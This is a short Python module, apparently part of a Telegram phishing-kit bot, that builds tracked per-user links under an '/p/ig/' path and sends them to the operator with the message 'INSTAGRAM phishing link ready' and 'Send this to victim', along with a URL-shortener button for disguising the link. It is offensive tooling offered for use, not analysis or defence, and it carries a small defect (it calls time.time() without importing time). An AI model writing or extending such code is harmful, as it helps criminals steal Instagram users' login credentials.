from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import uuid
from bot.config import BASE_URL
from bot.utils.storage import link_cache

def generate_link(user_id):
    unique_id = str(uuid.uuid4())[:8]
    link = f"{BASE_URL}/p/ig/{unique_id}?v={user_id}"
    link_cache[unique_id] = {"user_id": user_id, "time": time.time()}
    return link

def handle_insta_button(bot, message, get_bottom_buttons):
    user_id = message.chat.id
    link = generate_link(user_id)
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("🔗 Open Link", url=link),
        InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
        InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/"),
        InlineKeyboardButton("⬅ Back", callback_data="back")
    )
    bot.send_message(
        user_id,
        f"✅ *INSTAGRAM phishing link ready:*\n\n`{link}`\n\nSend this to victim.",
        reply_markup=markup,
        parse_mode="Markdown"
    )
